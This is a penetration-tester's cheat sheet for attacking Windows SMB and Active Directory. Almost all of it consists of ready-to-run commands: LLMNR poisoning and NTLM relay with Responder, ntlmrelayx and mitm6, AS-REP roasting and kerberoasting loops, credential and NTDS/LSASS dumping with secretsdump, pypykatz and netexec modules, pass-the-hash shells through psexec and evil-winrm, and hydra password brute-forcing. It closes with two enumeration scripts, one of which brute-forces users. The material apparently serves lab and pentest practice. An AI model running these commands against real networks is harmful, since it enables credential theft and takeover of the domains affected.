### Strategy
- Quick wins: smbclient, cme, Responder, Impacket - dump and crack hashes (NTLMv2 relay, NTLMv1 crack)
	- capture a hash, crack or pass the hash, use new logins to dump secrets, use local admin hashes to respray network
- Scan for versions and vulnerabilities (nmap, enum4linux)
	- check signing requirements first thing
- Put files and further scan (win/linpeas, pypykatz, mimikatz)
	- mimikatz is very loud, only use if can turn off AV. Run with admin privilgeges from cmd
 	- `python3 -m http.server 80` from location file that you want to transfer. Navigate to ac ip from vc 
 - Attempt a shell (psexec.py, wmiexec.py, smbexec.py, atexec.py, dcomexec.py)
  		- `psexec.py domain.local/username:'Password'@10.0.0.12`
    	- `psexec.py username@10.0.0.12 -hashes [pastedhashtext]`
   		- `smbexec.py DOMAIN/username:password@10.10.10.10`
- Search through files for pertinent information and editable files
	- Enum programs being used to search for vulns and default creds
- searchsploit and metasploit
- If can get any credentials, attempt to dump LSASS, ldap and NTDS.dit
	- smbclient.py, ldapdomaindump, secretsdump.py (DCSync)
 		- `ntlmrelayx.py -6 -t ldaps://10.0.0.12 -wh fakewpad.dc.local -l ldapdump` with `mitm6 -d domain.local`
   		- `ldapdomaindump ldaps://dc.ip -u 'domain\username' -p Password1`
   			- use bloodhound to analyze ldap
      			- `bloodhound-python -u username -p password -d domain.local -ns 10.10.10.10 -c All` with neo4j console
         		- apt install bloodhound -> pip install bloodhound-python -> 'bloodhound' to access UI

### Nmap Scanning

- `nmap 10.0.0.12 --script=smb-enum*`
- `nmap 10.0.0.12 --script=smb-vuln*`
- `nmap 10.0.0.12 --script=smb-os*`
- `nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.0.0.12`
- `nmap --script=smb2-security-mode.nse -p445 10.0.0.25 -Pn`
	- if message signing is required but not enabled:
 	- **Responder**: LLMNR Poisoning attack - update config files /etc/responder/Responder.conf updated to SMB=off and HTTP=off
  		- `ntlmrelayx.py -tf targetips.txt -smb2support`
    	- run together with
     	- `responder -I eth0 -dwP`
     	-  identifies a host when DNS fails to
    - **Impacket**: ASREPRoasting/kerberoasting attack - dummy request for authentication TGT -> NTLM hash
    - Key Distribution Center (KDC) of domain controller checkes authentication service request (AS-REQ). verifies the user info and returns encrypted Ticket Granting Ticket (TGT). TGT has timestamp encrypted with NTLM hash. Can use TGT to request a TGS (service ticket) encrypted with server's account hash.
    	- Bash script
     		- `while read p; do GetNPUsers.py domain.local/"$p" -request -no-pass - dc-ip 10.0.0.12 >> hash.txt; done < unames.txt`


### If have rcpbind
- `nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.10.10`
- `rpcclient -U "" [ip]`
- **commands**
  - rpcclient>srvinfo
  - rpcclient>enumdomusers
  - rpcclient>getdompwinfo

### Commands/Tools
- *Bruteforce*
	- `hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt $ip smb`
- *crackmapexec*
	- `crackmapexec smb -L` lists all modules available with smb
 	- `cmedb` database can use to search `hosts` and `creds` to identify what has been discovered so far	 
 	- `cme smb 10.10.10.10 -u [username] -p '[password]' --shares`
		- this will list out the available shares
	- `cme smb 10.10.10.10 -u users -H hashes`
 	- `crackmapexec smb 10.0.0.0/24 -u username -d domain.local -p Password1`
  	- `crackmapexec smb 10.0.0.0/24 -u username -H <hash> --local-auth --sam`
  		- also can do --shares --lsa --M lsassy
- *netexec*
	- `netexec smb 10.0.0.10 -d domain.local -u username -p Password1 -M slinky -o NAME=test SERVER=10.0.0.12`
 	- `netexec ldap 10.0.0.10 -u Administrator -H ":hash"`
  		- can also run with: mssql, rdp, winrm
 - *nxc*
 	- `nxc smb 10.10.10.10 -u username -p password -d domain --lsa
	- `nxc smb 10.10.10.10 -u username -p password -d domain --sam`
	- `nxc smb 10.10.10.10 -u username -p password -d domain --dpapi nosystem`
	- `nxc smb 10.10.10.10 -u username -p password -d domain --dpapi cookies`
	- `nxc smb 10.10.10.10 -u username -p password -d domain --dpapi`
	- `nxc smb 10.10.10.10 -u username -p password -d domain --ntds`
	- `nxc smb 10.10.10.10 -u username -p password -d domain -M lsassy`
	- `nxc smb 10.10.10.10 -u username -p password -d domain -M nanodump`
	- `nxc smb 10.10.10.10 -u username -p password -d domain -M winscp`
	- `nxc smb 10.10.10.10 -u username -p password -d domain -M putty`
- *Smbclient*
	- `smbclient -L \\\\10.10.10.10\\`
	- `smbclient \\\\10.10.10.10\\ADMIN$`
	- `smbclient \\\\10.10.10.10\\IPC$`
	- `smbclient -L \\\\10.10.10.10\\`
	- `smbclient //10.10.10.10/anonymous`
	- Can recursively downlaod all the files here:
		- `smbget -R smb://10.10.10.10/anonymous`
	- `smbclient -L \\\\10.10.10.10\\anonymous`
	- `smbclient -U username \\\\10.10.10.10\\filename`
 	- *LSASS Dump*
		- `smbclient.py user:'password'@10.10.10.10`
    - `smbclient -N [\\\\10.10.10.10\\profiles$](file://10.10.10.10/profiles$) -c ls | awk '{ print $1 }'`
		- lists everything in the folder
- *Vuln scan*
	- `enum4linux -a -v 10.10.10.10`
		- if its a linux box
    - WinPEAS or LinPEAS
- *Hydra*
	- `hydra -l username -P passwordfile.txt smb://10.10.10.10 -t 4 -V`
- *Metasploit* for smb version
- *Evil-winrm* For a shell
	- if have `SeBackupPrivilege` is enabled can use evil-winrm
	- `evil-winrm -i 10.10.10.10 -u username -H hash`
- *Smbmap*
	- `smbmap -u {username} -p {password} -d {domain} -H 10.10.10.10`
	- add `-A '(xlsx|docx|txt|xml)' -R` at the end to crawl the users$ share
	- `smbmap -u guest -H 10.10.10.10`
- *Impacket*
	- secretsdump.py, wmiexec.py,
 	- `GetNPUsers.py domain.local/ -no-pass -userfiles users.txt -dc-ip 10.0.0.12 | grep -v 'KDC_ERR_C_PRINCIPAL_UNKNOWN'`
 	- `GetUserSPNs.py domain.local/username:Password1 -dc-ip 10.0.0.12 -request`
  	- `GetNPUsers.py domain.local/username -dc-ip 10.10.10.161 -no-pass`
 	- `secretsdump.py domain.local/username:'Password1'@dc.ip -just-dc-ntlm`
  	- `secretsdump.py domain/username:Password1@10.0.0.12`
  	- `secretsdump.py username:@10.0.0.12 --hashes NTLM_hash`
  	- `secretsdump.py -ntds NTDS.dit -system system.hive LOCAL`
- *pypykatz*
	- pip3 install pypykatz
	- `pypykatz lsa minidump lsass.DMP`
	- pypykatz to extract and crackmapexec to spray
	- `pypykatz lsa minidump lsass.DMP | grep 'NT:' | awk '{ print $2 }' | sort -u > hashes pypykatz lsa minidump lsass.DMP | grep 'Username:' | awk '{ print $2 }' | sort - u > users` `
 - *Searchploit* samba verisons
 - GPP (Group Policy Preferences) xml files in SYSVOL - Groups.xml
 	- Can use gpp -decrpy for cPassword
  		- `gpp-decrypt [text of cPassword]`

### SMB Commands
```
- ls
- dir
- cd
- history
- put
- get
- mget
- more
- pwd
- start
- open
- rename
- chmod
- getfacl
- echo
- cancel
- close
- exit
- recurse
- showacls
- vuid
```

## Scripts

### smbver.sh
```
#!/bin/sh
#Author: rewardone
#Description:
# Requires root or enough permissions to use tcpdump
# Will listen for the first 7 packets of a null login
# and grab the SMB Version
#Notes:
# Will sometimes not capture or will print multiple
# lines. May need to run a second time for success.
if [ -z $1 ]; then echo "Usage: ./smbver.sh RHOST {RPORT}" && exit; else rhost=$1; fi
if [ ! -z $2 ]; then rport=$2; else rport=139; fi
tcpdump -s0 -n -i tap0 src $rhost and port $rport -A -c 7 2>/dev/null | grep -i "samba\|s.a.m" | tr -d '.' | grep -oP 'UnixSamba.*[0-9a-z]' | tr -d '\n' & echo -n "$rhost: " &
echo "exit" | smbclient -L $rhost 1>/dev/null 2>/dev/null
sleep 0.5 && echo ""
```

### smbenum.sh
```
#!/bin/bash
# smbenum 0.2 - This script will enumerate SMB using every tool in the arsenal
# SECFORCE - Antonio Quina
# All credits to Bernardo Damele A. G. <bernardo.damele@gmail.com> for the ms08-067_check.py script

IFACE="eth0"

if [ $# -eq 0 ]
    then
        echo "Usage: $0 <IP>"
        echo "eg: $0 10.10.10.10"
        exit
    else
        IP="$1"
fi

echo -e "\n########## Getting Netbios name ##########"
nbtscan -v -h $IP

echo -e "\n########## Checking for NULL sessions ##########"
output=`bash -c "echo 'srvinfo' | rpcclient $IP -U%"`
echo $output

echo -e "\n########## Enumerating domains ##########"
bash -c "echo 'enumdomains' | rpcclient $IP -U%"

echo -e "\n########## Enumerating password and lockout policies ##########"
polenum $IP

echo -e "\n########## Enumerating users ##########"
nmap -Pn -T4 -sS -p139,445 --script=smb-enum-users $IP
bash -c "echo 'enumdomusers' | rpcclient $IP -U%"
bash -c "echo 'enumdomusers' | rpcclient $IP -U%" | cut -d[ -f2 | cut -d] -f1 > /tmp/$IP-users.txt

echo -e "\n########## Enumerating Administrators ##########"
net rpc group members "Administrators" -I $IP -U%

echo -e "\n########## Enumerating Domain Admins ##########"
net rpc group members "Domain Admins" -I $IP -U%

echo -e "\n########## Enumerating groups ##########"
nmap -Pn -T4 -sS -p139,445 --script=smb-enum-groups $IP

echo -e "\n########## Enumerating shares ##########"
nmap -Pn -T4 -sS -p139,445 --script=smb-enum-shares $IP

echo -e "\n########## Bruteforcing all users with 'password', blank and username as password"
hydra -e ns -L /tmp/$IP-users.txt -p password $IP smb -t 1
rm /tmp/$IP-users.txt
```
